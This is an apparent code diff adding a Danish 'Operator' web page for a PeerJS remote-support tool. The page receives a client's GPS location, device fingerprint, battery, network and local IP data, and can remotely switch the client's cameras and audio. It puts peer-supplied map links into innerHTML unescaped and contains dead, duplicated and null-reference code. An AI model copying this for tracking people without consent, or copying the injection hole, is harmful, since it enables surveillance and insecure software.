@@ -1,0 +1,961 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Operator</title>
+  <link rel="stylesheet" href="/style.css">
+  <style>
+    #localOperatorVideo {
+      max-width: 280px;
+    }
+
+    #videos {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 12px;
+      margin-top: 12px;
+      max-height: 70vh;
+      overflow: auto;
+      border: 1px solid #00ff00;
+      padding: 8px;
+    }
+
+    .cameraBox {
+      border: 1px solid #00ff00;
+      padding: 8px;
+      min-height: 220px;
+    }
+
+    .cameraBox h3 {
+      margin-top: 0;
+      font-size: 14px;
+    }
+
+    .topGrid {
+      display: grid;
+      grid-template-columns: minmax(220px, 300px) 1fr;
+      gap: 12px;
+      align-items: start;
+    }
+
+    @media (max-width: 800px) {
+      .topGrid {
+        grid-template-columns: 1fr;
+      }
+    }
+  
+    @keyframes chatBlink {
+      0% { background:#000; color:#00ff00; }
+      50% { background:#00ff00; color:#000; }
+      100% { background:#000; color:#00ff00; }
+    }
+
+    .chatBlink {
+      animation: chatBlink 0.8s infinite;
+    }
+  
+    .infoGrid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 12px;
+      margin-top: 12px;
+    }
+
+    .infoGrid h3 {
+      margin-bottom: 4px;
+    }
+
+    .infoGrid .panel {
+      margin-top: 0;
+      max-height: 180px;
+      font-size: 13px;
+      line-height: 1.35;
+    }
+
+    .buttonRow {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+  
+    #primitiveVideos {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 12px;
+      margin-top: 12px;
+      border: 1px solid var(--accent);
+      padding: 8px;
+    }
+  </style>
+</head>
+<body>
+<header style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
+  <h2 style="margin:0;">OPERATOR</h2>
+
+  <button id="openChatBtn">CHAT</button>
+
+  <input id="clientLink" readonly
+    style="width:320px; background:#000; color:#00ff00; border:1px solid #00ff00; padding:6px;"
+  >
+
+  <button id="copyClientLinkBtn">Kopiér</button>
+  <button id="qrClientLinkBtn">QR</button>
+  <button id="toggleColorBtn">Grøn/Orange</button>
+<div id="systemStatusBox" style="margin-left:auto; border:1px solid var(--accent); padding:6px;">
+    System: tjekker...
+  </div>
+</header>
+<main>
+  <p>Status: <span id="status">venter...</span></p>
+
+  
+
+  <div class="topGrid">
+    <div>
+      <h3>Dit kamera til brugeren</h3>
+      <video id="localOperatorVideo" autoplay muted playsinline controls></video>
+      <br><br>
+      <div class="buttonRow">
+        <button id="startOperatorBtn">Start operator-kamera</button>
+        <button id="stopOperatorBtn">Sluk operator-kamera</button>
+      </div>
+
+      <div style="margin-top:10px;">
+        
+        <div style="margin-top:10px; max-width:320px;">
+        
+        <div style="margin-top:10px;">
+        <div style="margin-bottom:6px;">Operator-lyd</div>
+        <audio id="clientAudio" autoplay muted controls style="width:280px;"></audio>
+      </div>
+      </div>
+        <div style="margin-top:10px;">
+        <div style="margin-bottom:6px;">Operator-lyd hos klient</div>
+        <button id="clientRemoteAudioToggleBtn">Mute</button>
+        <input id="clientVolumeRange" type="range" min="0" max="100" value="100" style="width:280px; display:block; margin-top:10px;">
+        <div id="clientAudioControlStatus" style="margin-top:6px;">Ikke sendt endnu</div>
+      </div>
+      </div>
+    </div>
+
+    <div>
+      <h3>Client info</h3>
+      <div class="panel" id="chat">DetectRTC info vises her...</div>
+
+      <div class="infoGrid">
+        <div>
+          <h3>GPS / Lokation</h3>
+          <div class="panel" id="gpsBox">GPS info vises her...</div>
+        </div>
+
+        <div>
+          <h3>Batteri</h3>
+          <div class="panel" id="batteryBox">Batteri info vises her...</div>
+        </div>
+
+        <div>
+          <h3>Telefontype</h3>
+          <div class="panel" id="phoneModelBox">Telefontype vises her...</div>
+        </div>
+
+        <div>
+          <h3>Enhed</h3>
+          <div class="panel" id="deviceBox">Enhedsinfo vises her...</div>
+        </div>
+
+        <div>
+          <h3>Netværk / IP</h3>
+          <div class="panel" id="ipBox">IP-info vises her...</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3>Kamera-vælger</h3>
+  <div id="cameraSelector" class="panel">Ingen kameraer registreret endnu.</div>
+
+  <h3>Primitiv kameravisning</h3>
+  <div id="primitiveVideos"></div>
+
+</main>
+
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
+const statusEl = document.getElementById("status");
+const clientAudio = document.getElementById("clientAudio");
+
+const clientRemoteAudioToggleBtn = document.getElementById("clientRemoteAudioToggleBtn");
+let clientRemoteMuted = false;
+const clientVolumeRange = document.getElementById("clientVolumeRange");
+const clientAudioControlStatus = document.getElementById("clientAudioControlStatus");
+
+const systemStatusBox = document.getElementById("systemStatusBox");
+const clientLink = document.getElementById("clientLink");
+const copyClientLinkBtn = document.getElementById("copyClientLinkBtn");
+const qrClientLinkBtn = document.getElementById("qrClientLinkBtn");
+const toggleColorBtn = document.getElementById("toggleColorBtn");
+const chat = document.getElementById("chat");
+const gpsBox = document.getElementById("gpsBox");
+const batteryBox = document.getElementById("batteryBox");
+const phoneModelBox = document.getElementById("phoneModelBox");
+const deviceBox = document.getElementById("deviceBox");
+const ipBox = document.getElementById("ipBox");
+const videos = null;
+const primitiveVideos = document.getElementById("primitiveVideos");
+const cameraSelector = document.getElementById("cameraSelector");
+const openChatBtn = document.getElementById("openChatBtn");
+
+let chatWindow = null;
+let activeConn = null;
+let activeCameraBoxes = {};
+let primitiveCameraBoxes = {};
+let availableCameras = [];
+let activeCameraIndexes = {};
+let unreadChat = false;
+const CHAT_KEY = "operatorChatHistory";
+let chatBuffer = JSON.parse(localStorage.getItem(CHAT_KEY) || "[]");
+
+
+
+
+
+function sendClientAudioCommand(command) {
+  if (!activeConn || !activeConn.open) {
+    clientAudioControlStatus.textContent = "Ingen aktiv klientforbindelse";
+    return;
+  }
+
+  activeConn.send({
+    type: "client-audio-control",
+    command
+  });
+
+  clientAudioControlStatus.textContent = "Sendt";
+}
+
+clientRemoteAudioToggleBtn.onclick = () => {
+  clientRemoteMuted = !clientRemoteMuted;
+  sendClientAudioCommand({ muted: clientRemoteMuted });
+  clientRemoteAudioToggleBtn.textContent = clientRemoteMuted ? "Unmute" : "Mute";
+};
+clientVolumeRange.oninput = () => sendClientAudioCommand({ volume: Number(clientVolumeRange.value) / 100 });
+
+function openChatWindow() {
+  if (!chatWindow || chatWindow.closed) {
+    chatWindow = window.open("", "operatorChat", "width=420,height=620");
+    chatWindow.document.write(`
+      <!doctype html>
+      <html>
+      <head>
+        <title>Chat</title>
+        <style>
+          body { background:#000; color:#00ff00; font-family:monospace; margin:0; padding:10px; }
+          #messages { height:500px; overflow:auto; border:1px solid #00ff00; padding:8px; margin-top:8px; }
+          input { width:75%; background:#000; color:#00ff00; border:1px solid #00ff00; padding:8px; }
+          button { background:#000; color:#00ff00; border:1px solid #00ff00; padding:8px; }
+        </style>
+      </head>
+      <body>
+        <h2>CHAT</h2>
+        <input id="msg" placeholder="Skriv besked...">
+        <button id="send">Send</button>
+        <div id="messages"></div>
+      </body>
+      </html>
+    `);
+
+    chatWindow.document.close();
+
+    chatWindow.document.getElementById("send").onclick = () => {
+      const input = chatWindow.document.getElementById("msg");
+      const msg = input.value.trim();
+      if (!msg || !activeConn) return;
+
+      activeConn.send({
+        type: "chat",
+        from: "operator",
+        message: msg,
+        timestamp: new Date().toLocaleTimeString()
+      });
+
+      addChatMessage("Mig", msg, new Date().toLocaleTimeString());
+      input.value = "";
+    };
+
+    chatWindow.document.getElementById("msg").addEventListener("keydown", e => {
+      if (e.key === "Enter") {
+        chatWindow.document.getElementById("send").click();
+      }
+    });
+  }
+
+  renderChatBuffer();
+  unreadChat = false;
+  openChatBtn.classList.remove("chatBlink");
+  openChatBtn.style.background = "#000";
+  chatWindow.focus();
+}
+
+function renderChatBuffer() {
+  if (!chatWindow || chatWindow.closed) return;
+
+  const messages = chatWindow.document.getElementById("messages");
+  messages.innerHTML = "";
+
+  [...chatBuffer].reverse().forEach(item => {
+    const div = chatWindow.document.createElement("div");
+    div.textContent = "[" + item.timestamp + "] " + item.from + ": " + item.message;
+    messages.appendChild(div);
+  });
+
+  messages.scrollTop = 0;
+}
+
+function addChatMessage(from, message, timestamp) {
+  chatBuffer.push({
+  /* persist */
+    from,
+    message,
+    timestamp: timestamp || new Date().toLocaleTimeString()
+  });
+
+  localStorage.setItem(CHAT_KEY, JSON.stringify(chatBuffer));
+
+  if (chatWindow && !chatWindow.closed) {
+    renderChatBuffer();
+  }
+}
+
+openChatBtn.onclick = openChatWindow;
+const localOperatorVideo = document.getElementById("localOperatorVideo");
+const startOperatorBtn = document.getElementById("startOperatorBtn");
+const stopOperatorBtn = document.getElementById("stopOperatorBtn");
+
+const generatedClientLink = location.origin + "/client.html";
+clientLink.value = generatedClientLink;
+
+copyClientLinkBtn.onclick = async () => {
+  try {
+    await navigator.clipboard.writeText(generatedClientLink);
+    copyClientLinkBtn.textContent = "Kopieret";
+    setTimeout(() => copyClientLinkBtn.textContent = "Kopiér", 1500);
+  } catch {
+    clientLink.select();
+    document.execCommand("copy");
+    copyClientLinkBtn.textContent = "Kopieret";
+    setTimeout(() => copyClientLinkBtn.textContent = "Kopiér", 1500);
+  }
+};
+
+
+function applyAccent(color) {
+  document.documentElement.style.setProperty("--accent", color);
+  localStorage.setItem("operatorAccentColor", color);
+}
+
+applyAccent(localStorage.getItem("operatorAccentColor") || "#00ff00");
+
+toggleColorBtn.onclick = () => {
+  const current = localStorage.getItem("operatorAccentColor") || "#00ff00";
+  applyAccent(current === "#00ff00" ? "#ff9900" : "#00ff00");
+};
+
+function htmlEscape(value) {
+  return String(value)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+qrClientLinkBtn.onclick = () => {
+  const win = window.open("", "clientQrCode", "width=380,height=500");
+
+  if (!win) {
+    alert("Popup blokeret. Tillad popups for denne side.");
+    return;
+  }
+
+  win.document.write(`
+    <!doctype html>
+    <html>
+    <head>
+      <title>QR kode</title>
+      <style>
+        body { background:#000; color:#00ff00; font-family:monospace; text-align:center; padding:20px; }
+        #qrcode {
+          display:inline-block;
+          background:#fff;
+          padding:10px;
+          margin:15px 0;
+        }
+        input { width:95%; background:#000; color:#00ff00; border:1px solid #00ff00; padding:8px; }
+        button { background:#000; color:#00ff00; border:1px solid #00ff00; padding:8px; margin-top:10px; }
+        .error { color:#ff9900; border:1px solid #ff9900; padding:8px; margin-top:10px; }
+      </style>
+    </head>
+    <body>
+      <h2>Scan klient-link</h2>
+      <div id="qrcode"></div>
+      <input id="qrLinkText" readonly value="${htmlEscape(generatedClientLink)}">
+      <br>
+      <button id="copyQrLinkBtn">Kopiér link</button>
+      <div id="qrError" class="error" style="display:none;"></div>
+    </body>
+    </html>
+  `);
+
+  win.document.close();
+
+  const copyBtn = win.document.getElementById("copyQrLinkBtn");
+  const linkText = win.document.getElementById("qrLinkText");
+  const errorBox = win.document.getElementById("qrError");
+
+  copyBtn.onclick = async () => {
+    try {
+      await win.navigator.clipboard.writeText(generatedClientLink);
+      copyBtn.textContent = "Kopieret";
+      setTimeout(() => copyBtn.textContent = "Kopiér link", 1500);
+    } catch {
+      linkText.select();
+      win.document.execCommand("copy");
+      copyBtn.textContent = "Kopieret";
+      setTimeout(() => copyBtn.textContent = "Kopiér link", 1500);
+    }
+  };
+
+  try {
+    if (typeof QRCode === "undefined") {
+      throw new Error("QR-biblioteket kunne ikke indlæses. Kontrollér netværksforbindelse eller brug et lokalt QR-bibliotek.");
+    }
+
+    new QRCode(win.document.getElementById("qrcode"), {
+      text: generatedClientLink,
+      width: 300,
+      height: 300,
+      correctLevel: QRCode.CorrectLevel ? QRCode.CorrectLevel.M : undefined
+    });
+  } catch (err) {
+    errorBox.style.display = "block";
+    errorBox.textContent = "QR kunne ikke genereres lokalt: " + err.message;
+  }
+};
+
+
+async function checkSystemStatus() {
+  try {
+    const res = await fetch("/api/status", { cache: "no-store" });
+
+    if (!res.ok) throw new Error("HTTP " + res.status);
+
+    const data = await res.json();
+
+    systemStatusBox.innerHTML =
+      "System: OK<br>" +
+      "Server: kører<br>" +
+      "Uptime: " + data.uptimeSeconds + " sek.";
+
+    systemStatusBox.style.color = "var(--accent)";
+  } catch (err) {
+    systemStatusBox.innerHTML =
+      "System: FEJL<br>" +
+      "Server svarer ikke<br>" +
+      "Prøv: docker restart webrtc-support";
+
+    systemStatusBox.style.color = "#ff9900";
+  }
+}
+
+checkSystemStatus();
+setInterval(checkSystemStatus, 10000);
+
+let latestClientPeerId = null;
+let latestSessionId = null;
+let operatorStream = null;
+let operatorAudioStream = null;
+
+const peer = new Peer("operator", {
+  host: location.hostname,
+  port: location.port || 8443,
+  path: "/peerjs",
+  secure: location.protocol === "https:"
+});
+
+
+async function ensureOperatorAudioStream() {
+  try {
+    if (!operatorAudioStream) {
+      operatorAudioStream = await navigator.mediaDevices.getUserMedia({
+        audio: {
+          echoCancellation: true,
+          noiseSuppression: true,
+          autoGainControl: true
+        },
+        video: false
+      });
+    }
+
+    if (latestClientPeerId) {
+      peer.call(latestClientPeerId, operatorAudioStream, {
+        metadata: { type: "operator-audio-only" }
+      });
+      statusEl.textContent = "sender separat operator-lyd";
+    }
+  } catch (err) {
+    statusEl.textContent = "operator-lyd fejl: " + err.message;
+  }
+}
+
+peer.on("open", () => {
+  statusEl.textContent = "klar som operator";
+});
+
+startOperatorBtn.onclick = async () => {
+  try {
+    if (operatorStream) {
+      operatorStream.getTracks().forEach(track => track.stop());
+      operatorStream = null;
+    }
+
+    operatorStream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: false
+    });
+
+    await ensureOperatorAudioStream();
+
+    localOperatorVideo.muted = true;
+    localOperatorVideo.volume = 0;
+    localOperatorVideo.muted = true;
+    localOperatorVideo.volume = 0;
+    localOperatorVideo.srcObject = operatorStream;
+    startOperatorBtn.textContent = "Operator-kamera aktivt";
+    startOperatorBtn.disabled = true;
+    stopOperatorBtn.disabled = false;
+
+    if (latestClientPeerId) {
+      peer.call(latestClientPeerId, operatorStream, {
+        metadata: { type: "operator-video-only" }
+      });
+      statusEl.textContent = "sender operator-video til bruger";
+    }
+  } catch (err) {
+    statusEl.textContent = "operator-kamera fejl: " + err.message;
+  }
+};
+
+stopOperatorBtn.onclick = () => {
+  if (operatorStream) {
+    operatorStream.getTracks().forEach(track => track.stop());
+    operatorStream = null;
+  }
+
+  localOperatorVideo.srcObject = null;
+  startOperatorBtn.textContent = "Start operator-kamera";
+  startOperatorBtn.disabled = false;
+  stopOperatorBtn.disabled = true;
+  statusEl.textContent = "operator-kamera slukket";
+};
+
+stopOperatorBtn.disabled = true;
+
+
+function renderCameraSelector() {
+  if (!availableCameras.length) {
+    cameraSelector.textContent = "Ingen kameraer registreret endnu.";
+    return;
+  }
+
+  cameraSelector.innerHTML = "";
+
+  availableCameras.forEach(cam => {
+    const row = document.createElement("div");
+    row.style.display = "flex";
+    row.style.gap = "8px";
+    row.style.alignItems = "center";
+    row.style.marginBottom = "6px";
+    row.style.flexWrap = "wrap";
+
+    const name = document.createElement("span");
+    name.textContent = "[" + cam.index + "] " + cam.label;
+    name.style.minWidth = "220px";
+
+    const startBtn = document.createElement("button");
+    startBtn.textContent = activeCameraIndexes[cam.index] ? "Genstart stream" : "Vis stream";
+    startBtn.onclick = () => {
+      if (!activeConn || !activeConn.open) {
+        statusEl.textContent = "ingen aktiv klientforbindelse";
+        return;
+      }
+
+      activeCameraIndexes[cam.index] = true;
+
+      activeConn.send({
+        type: "start-camera",
+        index: cam.index,
+        label: cam.label,
+        deviceId: cam.deviceId
+      });
+
+      renderCameraSelector();
+    };
+
+    const stopBtn = document.createElement("button");
+    stopBtn.textContent = "Skjul/sluk";
+    stopBtn.onclick = () => {
+      activeCameraIndexes[cam.index] = false;
+
+      if (activeConn && activeConn.open) {
+        activeConn.send({
+          type: "stop-camera",
+          index: cam.index
+        });
+      }
+
+      const key = (latestSessionId || "default-session") + "-camera-" + cam.index;
+      const box = activeCameraBoxes[key];
+
+      if (box) {
+        const video = box.querySelector("video");
+        if (video && video.srcObject) {
+          video.srcObject.getTracks().forEach(t => t.stop());
+        }
+
+        box.remove();
+        delete activeCameraBoxes[key];
+      }
+
+      renderCameraSelector();
+    };
+
+    row.appendChild(name);
+    row.appendChild(startBtn);
+    row.appendChild(stopBtn);
+    cameraSelector.appendChild(row);
+  });
+}
+
+peer.on("connection", conn => {
+  latestClientPeerId = conn.peer;
+  activeConn = conn;
+  statusEl.textContent = "dataforbindelse oprettet";
+  ensureOperatorAudioStream();
+
+  if (operatorStream) {
+    peer.call(latestClientPeerId, operatorStream, {
+      metadata: { type: "operator-video-only" }
+    });
+  }
+
+  conn.on("data", data => {
+    if (data.type === "client-audio-state") {
+      clientRemoteMuted = data.muted;
+      clientRemoteAudioToggleBtn.textContent = clientRemoteMuted ? "Unmute" : "Mute";
+      if (data.volume !== undefined) {
+        clientVolumeRange.value = Math.round(data.volume * 100);
+      }
+      clientAudioControlStatus.textContent = clientRemoteMuted ? "Klient muted" : "Klient unmuted";
+    }
+
+    if (data.type === "detectrtc") {
+      chat.textContent = JSON.stringify(data.report, null, 2);
+      availableCameras = data.report.cameras || [];
+      renderCameraSelector();
+    }
+
+    if (data.type === "camera-started") {
+      activeCameraIndexes[data.index] = true;
+      statusEl.textContent = "kamera aktivt: " + data.label;
+      renderCameraSelector();
+    }
+
+    if (data.type === "camera-stopped") {
+      activeCameraIndexes[data.index] = false;
+      statusEl.textContent = "kamera stoppet: " + data.index;
+      renderCameraSelector();
+    }
+
+    
+    
+    if (data.type === "session") {
+      latestSessionId = data.sessionId;
+      statusEl.textContent = "Session: " + data.sessionId + (data.reconnected ? " (genoprettet)" : "");
+    }
+
+    if (data.type === "chat") {
+      addChatMessage("Bruger", data.message, data.timestamp);
+
+      if (!chatWindow || chatWindow.closed) {
+        unreadChat = true;
+        openChatBtn.classList.add("chatBlink");
+      }
+    }
+
+    if (data.type === "chat") return;
+
+    if (data.type === "phone-model") {
+      const p = data.phoneModel;
+      phoneModelBox.textContent =
+        "Fundet model: " + p.detectedModel + "\n" +
+        "Kilde: " + p.source + "\n\n" +
+        "User-Agent:\n" + p.userAgent + "\n\n" +
+        "UA Client Hints:\n" + JSON.stringify(p.uaData, null, 2);
+    }
+
+    if (data.type === "phone-model-error") {
+      phoneModelBox.textContent = "Telefontype fejl: " + data.error;
+    }
+
+    if (data.type === "device-extra") {
+      const d = data.device;
+      deviceBox.textContent =
+        "Platform: " + d.platform + "\n" +
+        "Vendor: " + d.vendor + "\n" +
+        "Sprog: " + d.language + "\n" +
+        "Tidszone: " + d.timezone + "\n" +
+        "Online: " + (d.online ? "ja" : "nej") + "\n" +
+        "Cookies: " + (d.cookieEnabled ? "ja" : "nej") + "\n" +
+        "CPU-tråde: " + d.cpuThreads + "\n" +
+        "RAM-estimat: " + d.deviceMemoryGB + " GB\n" +
+        "Touch points: " + d.maxTouchPoints + "\n" +
+        "Skærm: " + d.screen.width + "x" + d.screen.height + "\n" +
+        "Ledig skærm: " + d.screen.availableWidth + "x" + d.screen.availableHeight + "\n" +
+        "Pixel ratio: " + d.screen.pixelRatio + "\n" +
+        "Farvedybde: " + d.screen.colorDepth + "\n" +
+        "Orientering: " + d.screen.orientation + "\n\n" +
+        "User agent:\n" + d.userAgent;
+    }
+
+    if (data.type === "device-extra-error") {
+      deviceBox.textContent = "Enhedsinfo fejl: " + data.error;
+    }
+
+    if (data.type === "network-info") {
+      const n = data.network;
+      if (typeof n.connection === "object") {
+        ipBox.textContent =
+          "Online: " + (n.online ? "ja" : "nej") + "\n" +
+          "Forbindelsestype: " + n.connection.type + "\n" +
+          "Effektiv type: " + n.connection.effectiveType + "\n" +
+          "Downlink: " + n.connection.downlinkMbps + " Mbps\n" +
+          "RTT: " + n.connection.rttMs + " ms\n" +
+          "Data saver: " + (n.connection.saveData ? "ja" : "nej") + "\n\n" +
+          n.note;
+      } else {
+        ipBox.textContent =
+          "Online: " + (n.online ? "ja" : "nej") + "\n" +
+          "Netværksinfo: " + n.connection + "\n\n" +
+          n.note;
+      }
+    }
+
+    if (data.type === "network-info-error") {
+      ipBox.textContent = "Netværksinfo fejl: " + data.error;
+    }
+
+    if (data.type === "mobile-ip-results") {
+      ipBox.textContent =
+        "Mobil IP/ICE-resultat" + (data.manual ? " (manuel)" : " (auto)") + ":\n" +
+        (data.ips && data.ips.length ? data.ips.join("\n") : "Ingen IP-adresser fundet") +
+        "\n\n" + data.note;
+    }
+
+    if (data.type === "mobile-ip-error") {
+      ipBox.textContent = "Mobil IP-fejl: " + data.error;
+    }
+
+    if (data.type === "battery") {
+      const b = data.battery;
+      batteryBox.textContent =
+        "Batteri: " + b.levelPercent + "%\n" +
+        "Oplader: " + (b.charging ? "ja" : "nej") + "\n" +
+        "Opladningstid: " + b.chargingTime + "\n" +
+        "Afladningstid: " + b.dischargingTime;
+    }
+
+    if (data.type === "battery-error") {
+      batteryBox.textContent = "Batteri: " + data.error;
+    }
+
+    if (data.type === "gps") {
+      const gps = data.gps;
+      gpsBox.innerHTML =
+        "Latitude: " + gps.latitude + "\n" +
+        "Longitude: " + gps.longitude + "\n" +
+        "Nøjagtighed: " + gps.accuracyMeters + " meter\n" +
+        "Tidspunkt: " + gps.timestamp + "\n\n" +
+        '<a style="color:#00ff00" target="_blank" href="' + gps.mapUrl + '">Åbn på kort</a>';
+    }
+
+    if (data.type === "gps-error") {
+      gpsBox.textContent = "GPS fejl: " + data.error;
+    }
+
+    if (data.type === "camera-error") {
+      chat.textContent += "\n\nKAMERA FEJL:\n" + JSON.stringify(data, null, 2);
+    }
+  });
+});
+
+peer.on("call", call => {
+  const meta = call.metadata || {};
+  const label = meta.label || "Kamera";
+  const sessionId = meta.sessionId || "default-session";
+  const index = meta.index ?? "unknown";
+  const cameraKey = sessionId + "-camera-" + index;
+
+  call.answer();
+
+  call.on("stream", stream => {
+    // FIXED_PRIMITIVE_AUDIO_HANDLER
+    if (meta.type === "client-audio") {
+      clientAudio.srcObject = stream;
+      clientAudio.muted = false;
+      clientAudio.volume = 1.0;
+      statusEl.textContent = "modtager klient-lyd";
+      return;
+    }
+
+    if (meta.type === "primitive-camera") {
+      const box = document.createElement("div");
+      box.className = "cameraBox";
+
+      const title = document.createElement("h3");
+      title.textContent = meta.label || ("Kamera " + (meta.index ?? "?"));
+
+      const video = document.createElement("video");
+      video.autoplay = true;
+      video.playsInline = true;
+      video.controls = true;
+      video.muted = true;
+      video.srcObject = stream;
+
+      box.appendChild(title);
+      box.appendChild(video);
+      primitiveVideos.appendChild(box);
+
+      statusEl.textContent = "stream modtaget: " + title.textContent;
+      return;
+    }
+    if (meta.type === "client-audio") {
+      clientAudio.srcObject = stream;
+      clientAudio.muted = true;
+      clientAudio.volume = 1.0;
+      statusEl.textContent = "modtager klient-lyd";
+      return;
+    }
+
+    // Primitive kamera-visning: ingen dedup, ingen erstatning.
+    // Hver modtaget primitive stream får sit eget vindue.
+    if (meta.type === "primitive-camera") {
+      const box = document.createElement("div");
+      box.className = "cameraBox";
+
+      const title = document.createElement("h3");
+      title.textContent = meta.label || ("Kamera " + (meta.index ?? "?"));
+
+      const video = document.createElement("video");
+      video.autoplay = true;
+      video.playsInline = true;
+      video.controls = true;
+      video.muted = true;
+      video.volume = 1.0;
+      video.srcObject = stream;
+
+      box.appendChild(title);
+      box.appendChild(video);
+      primitiveVideos.appendChild(box);
+
+      statusEl.textContent = "primitiv stream modtaget: " + title.textContent;
+      return;
+    }
+
+    if (meta.type === "primitive-camera") {
+      const primitiveKey = "primitive-" + (meta.index ?? "unknown");
+      let box = primitiveCameraBoxes[primitiveKey];
+
+      if (!box) {
+        box = document.createElement("div");
+        box.className = "cameraBox";
+
+        const title = document.createElement("h3");
+        title.textContent = meta.label || "Primitive kamera";
+
+        const video = document.createElement("video");
+        video.autoplay = true;
+        video.playsInline = true;
+        video.controls = true;
+
+        box.appendChild(title);
+        box.appendChild(video);
+        primitiveVideos.appendChild(box);
+
+        primitiveCameraBoxes[primitiveKey] = box;
+      }
+
+      const title = box.querySelector("h3");
+      const video = box.querySelector("video");
+
+      title.textContent = meta.label || "Kamera " + meta.index;
+
+      if (video.srcObject) {
+        video.srcObject.getTracks().forEach(track => track.stop());
+      }
+
+      video.srcObject = stream;
+      statusEl.textContent = "stream modtaget: " + title.textContent;
+      return;
+    }
+    let box = activeCameraBoxes[cameraKey];
+
+    if (!box) {
+      box = document.createElement("div");
+      box.className = "cameraBox";
+      box.dataset.cameraKey = cameraKey;
+
+      const title = document.createElement("h3");
+      title.textContent = label;
+
+      const video = document.createElement("video");
+      video.autoplay = true;
+      video.playsInline = true;
+      video.controls = true;
+
+      box.appendChild(title);
+      box.appendChild(video);
+      videos.appendChild(box);
+
+      activeCameraBoxes[cameraKey] = box;
+    }
+
+    const title = box.querySelector("h3");
+    const video = box.querySelector("video");
+
+    title.textContent = label + " (" + sessionId + ")";
+
+    if (video.srcObject) {
+      video.srcObject.getTracks().forEach(track => track.stop());
+    }
+
+    video.srcObject = stream;
+
+    statusEl.textContent = "modtager stream: " + label;
+  });
+
+  call.on("close", () => {
+    statusEl.textContent = "stream lukket: " + label;
+  });
+
+  call.on("error", () => {
+    statusEl.textContent = "stream fejl: " + label;
+  });
+});
+
+peer.on("error", err => {
+  statusEl.textContent = "fejl: " + err.message;
+});
+</script>
+</body>
+</html>
